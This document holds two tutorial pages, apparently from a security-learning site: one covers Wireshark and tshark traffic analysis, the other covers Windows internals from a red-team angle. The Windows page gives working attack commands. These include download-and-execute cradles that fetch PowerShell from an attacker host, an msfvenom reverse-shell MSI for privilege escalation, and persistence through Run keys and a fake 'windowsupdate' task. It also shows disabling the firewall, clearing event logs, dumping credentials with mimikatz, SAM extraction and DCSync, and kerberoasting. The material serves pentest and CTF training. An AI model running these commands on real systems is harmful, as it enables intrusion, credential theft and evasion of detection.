title: Wireshark — Network Traffic Analysis
summary: Complete guide to Wireshark — capture filters, display filters, protocol dissection, TLS decryption, and real-world traffic analysis workflows for security rese
body:
wireshark — network traffic analysis complete guide to wireshark — capture filters, display filters, protocol dissection, tls decryption, and real-world traffic analysis workflows for security research and ctfs. security wireshark network pcap traffic analysis pentesting what is wireshark? wireshark is the world's most widely used network protocol analyser. it captures live packets from any interface and lets you inspect every byte of every frame — from ethernet headers down to application-layer payloads. whether you're debugging a protocol, hunting for credentials in cleartext, or reconstructing a compromised host's activity from a pcap, wireshark is the baseline tool. installation # kali / debian
apt install wireshark

# allow non-root capture (adds your user to wireshark group)
sudo dpkg-reconfigure wireshark-common   # choose yes
sudo usermod -ag wireshark $user
newgrp wireshark

# cli-only (no gui needed)
apt install tshark

# macos
brew install --cask wireshark > on linux, raw socket capture requires `cap_net_raw`. adding yourself to the `wireshark` group grants this without running as root. capture filters capture filters use bpf (berkeley packet filter) syntax and are applied **before** packets hit the buffer — essential for high-traffic environments. # by host
host 192.168.1.10
not host 192.168.1.1          # exclude default gateway noise

# by port
port 443
port 80 or port 443
not port 22                    # suppress ssh

# by protocol
icmp
udp
tcp

# by direction
src host 10.0.0.5
dst net 10.0.0.0/24

# combinations
tcp and host 10.10.10.5 and port 80
net 192.168.0.0/16 and not broadcast

# capture only syn packets (portscans, new connections)
tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0 set capture filters in: **capture → options → enter a capture filter** display filters display filters run on already-captured packets and use wireshark's own rich filter language. far more powerful than bpf. # protocol
http
dns
smb
ftp
telnet
ssl or tls

# ip address
ip.addr == 10.10.10.5
ip.src == 192.168.1.0/24
ip.dst != 10.0.0.1

# port
tcp.port == 4444
udp.port == 53

# http specifics
http.request.method == "post"
http.request.uri contains "login"
http.response.code == 200
http.cookie contains "session"

# dns
dns.qry.name contains "evil"
dns.flags.rcode != 0          # dns errors

# tcp flags
tcp.flags.syn == 1 and tcp.flags.ack == 0   # syn scan
tcp.flags.rst == 1                           # resets

# credentials in cleartext
ftp.request.command == "pass"
telnet                                        # entire stream is cleartext
http.authbasic                                # http basic auth header

# large transfers
frame.len > 1400

# specific string in payload
tcp contains "password"
frame contains "flag{" following streams the single most useful feature for application-layer analysis. right-click any packet → follow → tcp stream  (or udp / tls / http) this reassembles the full conversation in both directions, colour-coded — client in red, server in blue. you can:
- read cleartext http requests and responses in full
- see ftp commands and directory listings
- extract the raw bytes of a file transfer
- copy as hex, c array, or raw binary

**in the follow stream dialog** — use the *show and save data as* dropdown to switch between ascii, hex, raw, and base64 views. exporting objects (file extraction) wireshark can reconstruct transferred files directly from traffic. file → export objects → http
file → export objects → smb
file → export objects → dicom / imf / tftp this lists every file transferred over the selected protocol. click **save all** to dump them all to a directory. works on:
- http downloads (exe, zip, pdf, images)
- smb file shares
- tftp firmware uploads

**ctf tip:** a pcap with image files hidden in http traffic is a classic challenge. export objects, then run `file *` to identify them regardless of extension. tls decryption method 1 — pre-master secret log (browsers / apps) set the environment variable before launching the browser: export sslkeylogfile=~/tls-keys.log
chromium &
# or
firefox & then in wireshark: edit → preferences → protocols → tls
(pre)-master-secret log filename → ~/tls-keys.log all tls traffic from that browser session is now decryptable in real time. method 2 — server private key if you have the server's rsa private key (ctf, test lab, your own server): edit → preferences → protocols → tls → rsa keys list → add
ip: <server ip>   port: 443   protocol: http   key file: server.key > this only works for rsa key exchange — not ecdhe (forward-secret) ciphers. most modern servers use ecdhe, so the sslkeylogfile method is more universally useful. statistics & analysis views statistics → protocol hierarchy shows a breakdown of all protocols by packet count and bytes — instantly reveals what protocols dominate the capture. statistics → conversations lists all ip/tcp/udp conversations sorted by bytes. find the noisiest hosts immediately. statistics → endpoints all unique ips/macs — useful for host discovery from a pcap. statistics → io graph plots traffic volume over time. spike at a specific time? correlate with an event. statistics → http → requests
statistics → dns dedicated breakdowns for http and dns traffic. tshark — cli wireshark `tshark` is the headless version — essential for scripting, remote capture, and large pcap processing. # live capture to file
tshark -i eth0 -w capture.pcap

# read a pcap
tshark -r capture.pcap

# apply display filter
tshark -r capture.pcap -y 'http.request.method == "post"'

# extract specific fields
tshark -r capture.pcap -y dns -t fields -e ip.src -e dns.qry.name

# extract http host + uri
tshark -r capture.pcap -y http.request \
  -t fields -e http.host -e http.request.uri

# follow tcp stream 0
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# count conversations
tshark -r capture.pcap -q -z conv,ip

# decrypt tls with key log
tshark -r capture.pcap -o tls.keylog_file:tls-keys.log -y http

# extract credentials from ftp
tshark -r capture.pcap -y ftp -t fields \
  -e ip.src -e ftp.request.command -e ftp.request.arg real-world pentest workflow **on-path / tap capture** # capture on interface facing the target network
tshark -i eth0 -w pentest-$(date +%y%m%d).pcap

# quick wins — look for cleartext auth immediately
tshark -r pentest.pcap -y 'ftp or telnet or http.authbasic' \
  -t fields -e ip.src -e ip.dst -e text **after capture — triage steps**
1. protocol hierarchy → identify unexpected protocols
2. conversations → find the noisiest or most suspicious ips
3. filter `dns` → look for unusual domain resolutions
4. filter `http` → follow streams on interesting post requests
5. export objects → recover any transferred files
6. filter `tcp.flags.syn==1 && tcp.flags.ack==0` → map port scan activity

**credential extraction one-liner** tshark -r capture.pcap -y 'http.request.method=="post"' \
  -t fields -e ip.src -e http.host -e http.request.uri \
  -e http.file_data 2>/dev/null | grep -i 'pass\|user\|login\|token' ctf workflow most ctf pcap challenges fall into one of these patterns: # 1. string hunt — flag in cleartext traffic
strings capture.pcap | grep -i 'flag{\|ctf{\|htb{'
tshark -r capture.pcap -y 'frame contains "flag{"'

# 2. file extraction
# file → export objects → http (or smb)
# then: file * && binwalk *

# 3. credential leak
tshark -r capture.pcap -y 'http.authbasic or ftp.request.command=="pass"'
# base64 decode http basic: echo 'dxnlcjpwyxnz' | base64 -d

# 4. custom/unknown protocol
# statistics → protocol hierarchy → find the odd one out
# follow tcp stream → look at the raw bytes
# use data field: data contains <hex bytes>

# 5. dns exfiltration
tshark -r capture.pcap -y dns -t fields -e dns.qry.name \
  | sort | uniq | grep -v 'google\|microsoft\|apple'

# 6. decrypting tls (if key provided)
tshark -r capture.pcap -o tls.keylog_file:provided.log -y http2 **useful keyboard shortcuts** | task | command / action |
|------|------------------|
| capture filter (bpf) | set before capture: `host 10.0.0.5 and port 80` |
| display filter | filter bar: `http.request.method == "post"` |
| follow tcp stream | right-click packet → follow → tcp stream |
| extract files | file → export objects → http |
| decrypt tls | preferences → tls → keylog file |
| cli capture | `tshark -i eth0 -w out.pcap` |
| cli filter+fields | `tshark -r f.pcap -y dns -t fields -e dns.qry.name` |
| find string in pcap | `strings cap.pcap \| grep flag` |

title: Windows Fundamentals — The Complete Foundation
summary: Architecture, filesystem, registry, users, NTFS permissions, processes, services, PowerShell, Active Directory, event logs, and a red team lens on every layer.
body:
windows fundamentals — the complete foundation architecture, filesystem, registry, users, ntfs permissions, processes, services, powershell, active directory, event logs, and a red team lens on every layer. learn windows fundamentals powershell active-directory red-team privesc windows dominates enterprise environments. most corporate targets you will encounter run windows — workstations, servers, domain controllers. understanding how windows works at a deep level is not optional for anyone doing offensive security, incident response, or system administration.

this guide covers the os from the ground up: the filesystem, identity model, registry, processes, services, powershell, and active directory. red team perspectives are embedded throughout every section — because understanding how things get abused is the fastest way to understand why they're designed the way they are. windows architecture overview windows splits execution into two privilege levels:

- **user mode** — applications, services, subsystems. restricted hardware access. crashes here affect only the process.
- **kernel mode** — the windows kernel (`ntoskrnl.exe`), hardware abstraction layer (`hal.dll`), drivers. full hardware access. crashes here are bsods. ┌─────────────────────────────────────────────────┐
│  user mode                                       │
│  win32 apps   .net apps   services   win32 api  │
│       ↕            ↕          ↕         ↕       │
│  ntdll.dll  (syscall boundary)                  │
├─────────────────────────────────────────────────┤
│  kernel mode                                     │
│  windows kernel (ntoskrnl.exe)                  │
│  hal · drivers · win32k.sys (gui)               │
└─────────────────────────────────────────────────┘ **key system processes** (always running, always in task manager): **`lsass.exe`** is the highest-value target in memory. it holds ntlm hashes, kerberos tickets, and plaintext credentials (on older configs). mimikatz dumps from lsass are the backbone of credential-based lateral movement. the filesystem windows uses **ntfs** (new technology file system) as its primary filesystem. unlike linux's single tree, windows uses drive letters — `c:\`, `d:\`, etc. key directories alternate data streams (ads) ntfs supports multiple data streams per file. the main content is the `$data` stream. additional streams are hidden by default — `dir` doesn't show them. # write to an alternate stream
echo "hidden payload" > file.txt:hidden
# read it back
more < file.txt:hidden
# discover ads
dir /r
gci -recurse | % { gi $_.fullname -stream * } | where stream -ne ':$data' malware hides payloads and config in ads. tools like `streams.exe` (sysinternals) or powershell can enumerate them. users, groups & privileges local accounts every windows machine has a local sam (security account manager) database stored at `c:\windows\system32\config\sam`. it stores local user accounts and their ntlm password hashes. the sam is locked by the os while windows runs — you need `system` privileges or a volume shadow copy to extract it.

**built-in local accounts:** built-in groups windows privileges (tokens) every process runs with an **access token** that contains the user's sid, group sids, and a list of **privileges**. privileges are capabilities beyond normal file permissions — they apply system-wide.

**high-value privileges for privilege escalation:** `seimpersonateprivilege` is the most common: iis app pools, sql server service accounts, and many service accounts have it by default. if you get code execution as one of these, you get system. # current user and privileges
whoami
whoami /all          # user, groups, and privileges
whoami /priv         # just privileges
whoami /groups       # just groups

# local users and groups
net user
net user administrator
net localgroup
net localgroup administrators

# powershell equivalents
get-localuser
get-localgroup
get-localgroupmember administrators

# all user profiles on the machine
get-childitem c:\users
get-childitem c:\users -force   # show hidden

# check for admin rights
([security.principal.windowsprincipal][security.principal.windowsidentity]::getcurrent()).isinrole([security.principal.windowsbuiltinrole]::administrator)

# cmd equivalents
net user
net localgroup administrators
query user           # logged-on users

# token / privilege info
[system.security.principal.windowsidentity]::getcurrent()

# who else is logged in?
query session
query user ntfs permissions & acls ntfs uses **access control lists (acls)** — far more granular than linux's rwx model. every file and folder has a **dacl** (discretionary acl) containing **aces** (access control entries), each granting or denying specific rights to a specific principal (user or group).

**ntfs permission types:** **permission inheritance** — child objects inherit permissions from parent by default. explicit aces override inherited ones. why this matters for attackers weakly configured acls are among the most common windows privilege escalation vectors:

- **writable service binary** — if a service executable is writable by your user, replace it with a payload
- **writable service binary directory** — dll hijacking: drop a malicious dll that the service loads
- **writable registry service key** — modify `imagepath` to point to your payload
- **genericwrite/genericall on ad objects** — in active directory, acl misconfigurations let you reset passwords, add group members, or perform targeted kerberoasting # view acl on a file or folder
get-acl c:\windows\system32
get-acl c:\programdata\myapp | format-list
(get-acl c:\temp\file.txt).access

# cmd
icacls c:\windows\system32
icacls c:\program files\vulnerableapp

# find writable directories in program files (privesc check)
get-childitem "c:\program files" -recurse -erroraction silentlycontinue | 
  foreach-object { 
    $acl = get-acl $_.fullname -erroraction silentlycontinue
    $acl.access | where-object { 
      $_.identityreference -match 'everyone|builtin\\users|authenticated users' -and
      $_.filesystemrights -match 'write|fullcontrol|modify'
    } | foreach-object { $_.identityreference.value + " -> " + $_.filesystemrights + " on " + $_.path }
  }

# check service binary permissions
get-wmiobject win32_service | select-object name, pathname, startname | 
  where-object { $_.pathname -ne $null } | foreach-object {
    $path = $_.pathname -replace '"',''
    $path = ($path -split ' ')[0]
    if (test-path $path) {
      $acl = get-acl $path -erroraction silentlycontinue
      $acl.access | where-object {
        $_.filesystemrights -match 'write|fullcontrol' -and
        $_.identityreference -notmatch 'system|administrators|trustedinstaller'
      } | foreach-object { "writable service: $path" }
    }
  }

# powersploit / powerup — automated privesc check
. .\powerup.ps1
invoke-allchecks the windows registry the **registry** is a hierarchical database that stores os and application configuration. it's central to how windows boots, how services start, and how applications behave — and it's riddled with persistence and privilege escalation opportunities. registry hive structure critical registry keys # service configuration — where services are defined
hklm\system\currentcontrolset\services\<servicename>
  imagepath   = path to executable
  objectname  = account it runs as

# autorun — executes on every user login
hkcu\software\microsoft\windows\currentversion\run
hklm\software\microsoft\windows\currentversion\run
hklm\software\microsoft\windows\currentversion\runonce

# installed software
hklm\software\microsoft\windows\currentversion\uninstall

# password policy
hklm\system\currentcontrolset\control\lsa

# lsa secrets / cached credentials
hklm\security\cache             (requires system)
hklm\security\policy\secrets    (requires system)

# alwaysinstallelevated — if both are 1, msi files run as system
hkcu\software\policies\microsoft\windows\installer\alwaysinstallelevated
hklm\software\policies\microsoft\windows\installer\alwaysinstallelevated

# uac settings
hklm\software\microsoft\windows\currentversion\policies\system
  enablelua       = 1 (uac on)
  consentpromptbehavioradmin **registry hive files on disk** (locked while windows runs — read via vss or offline):
- `c:\windows\system32\config\sam` — local account hashes
- `c:\windows\system32\config\system` — boot key (needed to decrypt sam)
- `c:\windows\system32\config\security` — lsa secrets
- `c:\windows\system32\config\software` — software config # read a registry value
get-itemproperty "hklm:\software\microsoft\windows nt\currentversion" -name productname
get-itemproperty "hklm:\system\currentcontrolset\services\wuauserv" | select imagepath

# cmd equivalent
reg query "hklm\software\microsoft\windows nt\currentversion" /v productname
reg query hklm\system\currentcontrolset\services\wuauserv

# autorun entries — persistence hunting
get-itemproperty "hkcu:\software\microsoft\windows\currentversion\run"
get-itemproperty "hklm:\software\microsoft\windows\currentversion\run"
reg query "hkcu\software\microsoft\windows\currentversion\run"
reg query "hklm\software\microsoft\windows\currentversion\run"

# check alwaysinstallelevated (privesc)
reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated
reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated
# if both return 1:
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.1 lport=4444 -f msi > shell.msi
msiexec /quiet /qn /i c:\temp\shell.msi   # runs as system

# set a registry value
set-itemproperty "hkcu:\software\microsoft\windows\currentversion\run" -name persist -value "c:\temp\payload.exe"
reg add "hkcu\software\microsoft\windows\currentversion\run" /v persist /t reg_sz /d "c:\temp\payload.exe" /f

# find plaintext passwords stored in registry (common sysadmin laziness)
reg query hklm /f password /t reg_sz /s
reg query hkcu /f password /t reg_sz /s
reg query "hklm\software\orl\winvnc3\password"
reg query "hkcu\software\simontatham\putty\sessions" /s  # saved putty sessions (creds)

# dump sam/system offline for hash extraction
reg save hklm\sam c:\temp\sam.hive
reg save hklm\system c:\temp\system.hive
# then on kali:
impacket-secretsdump -sam sam.hive -system system.hive local processes & services processes every running program is a process with a pid, a parent pid, an access token (identity), and memory space. windows processes can spawn child processes — this parent-child relationship is a key signal in edr detections (e.g., `winword.exe` spawning `powershell.exe` is almost always malware).

**process injection** — attackers inject shellcode into legitimate processes to hide under trusted process names and inherit their tokens. services services are long-running background processes managed by the **service control manager (scm)**, which itself runs as `services.exe`. services can run as:
- `localsystem` (system) — full os privileges
- `localservice` — reduced privileges, no network credentials
- `networkservice` — reduced privileges with network identity
- a specific domain or local account

service configuration lives in the registry at `hklm\system\currentcontrolset\services\<name>`.

**service privesc vectors:**
1. **unquoted service path** — if the path has spaces and isn't quoted, windows tries each space-separated segment as an executable
2. **writable service binary** — replace the exe with a payload
3. **writable service registry key** — modify `imagepath`
4. **weak service permissions** — `service_change_config` lets you change the binary path # process list
get-process
get-process | sort-object cpu -descending | select -first 20
get-process -name lsass      # specific process
get-wmiobject win32_process | select name, processid, parentprocessid, commandline

# cmd
tasklist
tasklist /v                  # verbose (includes username)
tasklist /svc                # which services run in which svchost

# kill a process
stop-process -name notepad
stop-process -id 1234 -force
taskkill /pid 1234 /f

# services
get-service
get-service | where-object { $_.status -eq 'running' }
get-service -name wuauserv | select *
sc query                     # cmd
sc query type= all state= all

# start/stop services (requires admin)
start-service -name wuauserv
stop-service  -name wuauserv
sc stop wuauserv
sc start wuauserv

# service details via wmi
get-wmiobject win32_service | select name, pathname, startname, state | format-table -autosize

# unquoted service paths (privesc check)
get-wmiobject win32_service | where-object {
    $_.pathname -notlike '"*' -and $_.pathname -like '* *'
} | select name, pathname, startname

# same with sc
wmic service get name,displayname,pathname,startmode | 
  findstr /i /v "c:\windows\\" | findstr /i /v "\""

# check service binary acls
get-wmiobject win32_service | select pathname | foreach-object {
    $p = ($_.pathname -split '"')[1]
    if ($p -and (test-path $p)) { icacls $p }
} cmd & powershell cmd (command prompt) `cmd.exe` is the legacy command interpreter. limited scripting, no object pipeline. still found everywhere and useful when powershell is restricted or monitored. powershell powershell is a full scripting environment built on .net. unlike cmd, powershell works with **.net objects** — you're not parsing text, you're passing structured data between cmdlets.

**powershell execution policy** — a speed bump, not a security boundary: restricted   — no scripts (default on desktop)
allpolicy    — only signed scripts
remotesigned — local scripts run; downloaded scripts need a signature
bypass       — nothing is blocked it can always be bypassed: powershell -executionpolicy bypass -file script.ps1
powershell -ep bypass -c "iex(new-object net.webclient).downloadstring('http://attacker/payload.ps1')" **powershell logging** — defenders enable:
- **script block logging** — logs every script block executed (even obfuscated, after deobfuscation)
- **module logging** — logs module pipeline execution
- **transcription** — full session transcript to file
- **amsi** — antimalware scan interface, scans script content before execution

knowing these exist shapes how attacks are detected and how defenders hunt. # help system
get-help get-process
get-help get-process -examples
get-command *user*       # find commands related to 'user'
get-command -module activedirectory

# variables
$name = "alice"
$ip   = "10.10.10.5"
$list = @("one", "two", "three")
$hash = @{ name="alice"; age=30 }

# pipeline — pass objects, not text
get-process | where-object { $_.cpu -gt 10 } | select-object name, cpu, id
get-service | where-object { $_.status -eq 'running' } | select name | sort name

# aliases (make it look like bash)
ls    # = get-childitem
cat   # = get-content
ps    # = get-process
kill  # = stop-process
echo  # = write-output

# file operations
get-content c:\windows\system32\drivers\etc\hosts
set-content c:\temp\file.txt "hello"
add-content c:\temp\file.txt "another line"
copy-item c:\temp\file.txt c:\temp\backup.txt
move-item c:\temp\old.txt c:\temp\new.txt
remove-item c:\temp\file.txt -force
new-item -itemtype directory c:\temp\newdir

# find files
get-childitem c:\ -recurse -filter "*.config" -erroraction silentlycontinue
get-childitem c:\users -recurse -include "*.txt","*.xml" -erroraction silentlycontinue

# search file contents
select-string -path c:\inetpub\wwwroot\* -pattern "password" -recurse
get-childitem c:\ -recurse -erroraction silentlycontinue | 
    select-string "password" 2>/dev/null

# download file (common payload staging)
(new-object net.webclient).downloadfile("http://10.10.14.1/shell.exe", "c:\temp\shell.exe")
invoke-webrequest -uri "http://10.10.14.1/shell.exe" -outfile "c:\temp\shell.exe"

# execute downloaded script in memory (fileless)
iex (new-object net.webclient).downloadstring("http://10.10.14.1/powerview.ps1")

# base64 encode a command (bypass some filters)
$cmd = "write-host 'hello'"
$bytes = [system.text.encoding]::unicode.getbytes($cmd)
$b64 = [convert]::tobase64string($bytes)
powershell -encodedcommand $b64

# wmi — query and execute
get-wmiobject win32_operatingsystem
get-wmiobject win32_computersystem
invoke-wmimethod -class win32_process -name create -argumentlist "cmd.exe" networking windows networking from the command line — essential for recon after landing on a box, setting up pivots, and understanding what's accessible. # interface info and ip addresses
ipconfig /all
get-netipaddress
get-netadapter

# routing table
route print
get-netroute

# dns
ipconfig /displaydns          # dns cache (reveals internal hostnames)
nslookup internal.corp
resolve-dnsname internal.corp
type c:\windows\system32\drivers\etc\hosts   # local overrides

# active connections and listening ports
netstat -ano                  # all connections with pid
netstat -ano | findstr listen
netstat -ano | findstr :445
get-nettcpconnection | where state -eq listen | select localaddress,localport,owningprocess
get-nettcpconnection | sort owningprocess

# map pid to process name
get-process -id (get-nettcpconnection -localport 80).owningprocess

# firewall
netsh advfirewall show allprofiles
get-netfirewallrule | where { $_.enabled -eq 'true' } | 
    select displayname, direction, action | format-table

# disable firewall (if admin)
netsh advfirewall set allprofiles state off
set-netfirewallprofile -all -enabled false

# arp cache (reveals hosts on the local segment)
arp -a
get-netneighbor

# shares
net share
get-smbshare
get-smbconnection

# enumerate accessible shares on a remote host
net view \\10.10.10.5
get-smbshare -cimsession 10.10.10.5

# map a network drive
net use z: \\10.10.10.5\c$ /user:administrator password
new-psdrive -name z -psprovider filesystem -root \\10.10.10.5\c$ -credential (get-credential)

# test connectivity
test-netconnection 10.10.10.5 -port 445
test-netconnection 10.10.10.5 -port 3389
ping 10.10.10.5

# port scan from powershell (no tools)
1..1000 | foreach-object {
    $port = $_
    $tcp = new-object net.sockets.tcpclient
    try {
        $tcp.connect("10.10.10.5", $port)
        write-host "$port open"
        $tcp.close()
    } catch {}
} scheduled tasks **scheduled tasks** are windows' equivalent of cron — they execute programs on a schedule, at boot, at login, or on system events. like cron, they're a primary **persistence** and **privilege escalation** vector.

tasks are stored as xml files in `c:\windows\system32\tasks\` and older `.job` files in `c:\windows\syswow64\tasks\`.

**attack scenarios:**
- find a task running as system that calls a writable script → overwrite it
- find a task calling a binary in a writable directory → dll hijack or binary replacement
- create a scheduled task for persistence (survives reboots, hides in task list) # list all scheduled tasks
get-scheduledtask
get-scheduledtask | select taskname, taskpath, state
schtasks /query /fo list /v
schtasks /query /fo table

# detailed info on a specific task
get-scheduledtask -taskname "mytask" | get-scheduledtaskinfo
(get-scheduledtask -taskname "mytask").actions
(get-scheduledtask -taskname "mytask").triggers
(get-scheduledtask -taskname "mytask").principal   # what user it runs as

# find tasks running as system with writable action path
get-scheduledtask | foreach-object {
    $task = $_
    $task.actions | foreach-object {
        if ($_.execute -and (test-path $_.execute -erroraction silentlycontinue)) {
            $acl = get-acl $_.execute -erroraction silentlycontinue
            $acl.access | where-object {
                $_.filesystemrights -match 'write|fullcontrol' -and
                $_.identityreference -notmatch 'system|administrators'
            } | foreach-object {
                "writable: $($task.taskname) -> $($_.execute)"
            }
        }
    }
}

# create a scheduled task (persistence)
$action  = new-scheduledtaskaction -execute "c:\temp\payload.exe"
$trigger = new-scheduledtasktrigger -atlogon
$principal = new-scheduledtaskprincipal -userid system -runlevel highest
register-scheduledtask -taskname "windowsupdate" -action $action -trigger $trigger -principal $principal

# cmd — create task (persistence, runs at startup as system)
schtasks /create /tn "windowsupdate" /tr "c:\temp\payload.exe" /sc onstart /ru system /f

# delete a task
unregister-scheduledtask -taskname "windowsupdate" -confirm:$false
schtasks /delete /tn "windowsupdate" /f

# task xml files — examine directly
get-content "c:\windows\system32\tasks\microsoft\windows\mytask" event logs windows event logs are the primary forensic source on a windows box. understanding what gets logged — and where — is essential for both detecting attacks and avoiding detection. key logs and event ids **critical security event ids:** **logon types** (field in 4624/4625): # list available event logs
get-eventlog -list
get-winevent -listlog * | select logname, recordcount | sort recordcount -descending

# read the security log
get-eventlog -logname security -newest 50
get-winevent -logname security -maxevents 100

# filter by event id
get-winevent -filterhashtable @{ logname='security'; id=4625 } -maxevents 50   # failed logons
get-winevent -filterhashtable @{ logname='security'; id=4624 } -maxevents 50   # successful logons
get-winevent -filterhashtable @{ logname='system';   id=7045 } -maxevents 20   # new services

# filter by time
get-winevent -filterhashtable @{
    logname='security'
    id=4624
    starttime=(get-date).addhours(-1)
} | select timecreated, message

# parse event message fields
get-winevent -filterhashtable @{ logname='security'; id=4624 } -maxevents 10 | foreach-object {
    $xml = [xml]$_.toxml()
    $data = $xml.event.eventdata.data
    [pscustomobject]@{
        time     = $_.timecreated
        user     = ($data | where name -eq 'targetusername').'#text'
        logontype= ($data | where name -eq 'logontype').'#text'
        ip       = ($data | where name -eq 'ipaddress').'#text'
    }
}

# check powershell script block logs (defenders hunt here)
get-winevent -logname "microsoft-windows-powershell/operational" -maxevents 50
get-winevent -filterhashtable @{ logname='microsoft-windows-powershell/operational'; id=4104 }

# clear event logs (anti-forensics — very noisy, triggers id 1102)
wevtutil cl security
wevtutil cl system
clear-eventlog -logname security

# cmd
wevtutil qe security /c:10 /rd:true /f:text
wevtutil qe security /q:"*[system[eventid=4625]]" /c:50 /f:text active directory fundamentals **active directory (ad)** is the directory service used by virtually every enterprise windows network. it centralises authentication and authorisation across the domain. understanding ad is mandatory for any enterprise red team or blue team work. core concepts **domain** — a logical grouping of objects (users, computers, groups) that share a common database and security policy. identified by a dns name, e.g. `corp.local`.

**domain controller (dc)** — a server running active directory domain services (ad ds). authenticates users, enforces policy, and holds the ad database (`ntds.dit`).

**forest** — one or more domains with trust relationships, sharing a schema and global catalog.

**organisational units (ous)** — containers within a domain for organising objects and applying group policy. key objects authentication: ntlm vs kerberos **ntlm** (challenge-response):
1. client → server: negotiate
2. server → client: challenge (nonce)
3. client → server: authenticate (hash of nonce + password hash)

ntlm hashes can be captured (responder) and cracked offline, or used directly in **pass-the-hash** attacks.

**kerberos** (ticket-based, preferred in ad):
1. client → kdc (dc): as-req — `"i am alice, give me a tgt"`
2. kdc → client: as-rep — tgt encrypted with `krbtgt` hash
3. client → kdc: tgs-req — `"i need a ticket for service x"` (presents tgt)
4. kdc → client: tgs-rep — service ticket encrypted with service account's hash
5. client → service: ap-req — presents service ticket

**attack surface on kerberos:**
- **kerberoasting** — any domain user can request a service ticket for any spn. the ticket is encrypted with the service account's hash → crack offline
- **as-rep roasting** — accounts with `dont_require_preauth` set return an as-rep that contains encrypted data → crack offline without any credentials
- **pass-the-ticket** — inject a kerberos ticket into your session
- **golden ticket** — forge a tgt using the `krbtgt` hash → impersonate any user forever
- **silver ticket** — forge a service ticket using the service account hash # ── built-in ad cmdlets (requires rsat) ───────────────────────────────────────
import-module activedirectory

# domain info
get-addomain
get-adforest

# users
get-aduser -filter * -properties *
get-aduser -filter * | select samaccountname, enabled, lastlogondate
get-aduser -identity alice -properties *

# find users with dont_require_preauth (as-rep roast targets)
get-aduser -filter { doesnotrequirepreauth -eq $true } -properties doesnotrequirepreauth

# find users with spn set (kerberoast targets)
get-aduser -filter { serviceprincipalname -ne "$null" } -properties serviceprincipalname |
    select samaccountname, serviceprincipalname

# groups
get-adgroup -filter *
get-adgroupmember -identity "domain admins"
get-adgroupmember -identity "domain admins" -recursive

# computers
get-adcomputer -filter * | select name, operatingsystem, lastlogondate

# domain controllers
get-addomaincontroller -filter *

# password policy
get-addefaultdomainpasswordpolicy

# gpos
get-gpo -all
get-gporeport -all -reporttype html -path c:\temp\gpo_report.html

# ── powerview (bloodhound / powersploit) ──────────────────────────────────────
# load powerview
iex (new-object net.webclient).downloadstring('http://10.10.14.1/powerview.ps1')

# domain info
get-netdomain
get-netdomaincontroller

# users
get-netuser
get-netuser -username alice
get-netuser | select samaccountname, description   # descriptions often contain passwords!

# find admin users
get-netgroupmember -groupname "domain admins"
get-netgroupmember -groupname "enterprise admins"

# find computers with unconstrained delegation
get-netcomputer -unconstrained

# find local admin access across domain
find-localadminaccess   # tests which machines your account is local admin on

# acl hunting — who has dangerous rights on what
find-interestingdomainacl | select objectdn, activedirectoryrights, identityreferencename

# ── kerberoasting ────────────────────────────────────────────────────────────
# with powerview
get-domainspnticket -outputformat hashcat | export-csv kerb_hashes.csv

# with rubeus
.\rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

# with impacket (from linux)
getuserspns.py corp.local/alice:password -dc-ip 10.10.10.100 -request

# crack the hashes
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# ── as-rep roasting ──────────────────────────────────────────────────────────
# with impacket
getnpusers.py corp.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip 10.10.10.100
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt credential harvesting windows stores credentials in many places. knowing where to look is a core skill. # powershell history — frequently contains credentials
get-content "$env:appdata\microsoft\windows\powershell\psreadline\consolehost_history.txt"
get-content (get-psreadlineoption).historysavepath

# credential manager
cmdkey /list
# extract with mimikatz:
# vault::cred

# find config files with passwords
get-childitem c:\ -recurse -include *.xml,*.config,*.ini,*.conf,*.txt -erroraction silentlycontinue |
    select-string -pattern "password|passwd|pwd|secret|credential" -erroraction silentlycontinue

# web.config files (iis / .net applications)
get-childitem c:\inetpub -recurse -filter web.config | 
    get-content | select-string -pattern "password|connectionstring"

# unattend.xml / sysprep — hardcoded creds from deployment
get-content c:\windows\panther\unattend.xml -erroraction silentlycontinue
get-content c:\windows\system32\sysprep\unattend.xml -erroraction silentlycontinue
get-content c:\windows\sysprep.inf -erroraction silentlycontinue

# putty saved sessions
reg query hkcu\software\simontatham\putty\sessions /s

# winscp stored credentials
reg query hkcu\software\martin prikryl\winscp 2\sessions /s

# filezilla stored credentials
get-content "$env:appdata\filezilla\recentservers.xml" -erroraction silentlycontinue
get-content "$env:appdata\filezilla\sitemanager.xml" -erroraction silentlycontinue

# mimikatz (requires admin / system + sedebugprivilege)
# run as admin:
mimikatz.exe
# inside mimikatz:
privilege::debug
sekurlsa::logonpasswords    # dump lsass — hashes and plaintext
sekurlsa::tickets           # kerberos tickets
lsadump::sam                # sam hashes
lsadump::dcsync /user:administrator  # dcsync (from dc or with rights)

# remote sam dump (if admin on remote host)
impacket-secretsdump administrator:password@10.10.10.5

# dcsync from linux (requires dcs' replication rights)
impacket-secretsdump -just-dc corp.local/alice:password@10.10.10.100

# lazagne — automated credential harvesting
lazagne.exe all
lazagne.exe browsers
lazagne.exe windows uac & bypass techniques **uac (user account control)** prompts for elevation when an admin-level operation is requested — even for administrators. it's a consent mechanism, not a security boundary, but it prevents silent privilege escalation.

**uac levels:**
- **always notify** — prompt for everything
- **default** — prompt only for app changes, not windows settings
- **notify only when apps make changes (no secure desktop)** — same but no dimming
- **never notify** — uac off

**token split** — when an admin logs in with uac enabled, they get two tokens: a standard user token for normal work and a high-integrity admin token for elevated operations. most processes run with the standard token.

**integrity levels:** every process and object has an integrity level. standard user = medium. elevated = high. system = system. uac is essentially a medium → high transition.

**uac bypass** — techniques that elevate from medium to high without a uac prompt, by abusing auto-elevating processes, com object hijacking, or dll injection into high-integrity processes. well-known examples: `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe` registry hijacks. # check current integrity level
[system.security.principal.windowsidentity]::getcurrent().groups |
    where { $_.value -eq 's-1-16-12288' } | select value  # s-1-16-12288 = high

# or with whoami
whoami /groups | findstr level

# check uac setting
reg query hklm\software\microsoft\windows\currentversion\policies\system /v consentpromptbehavioradmin
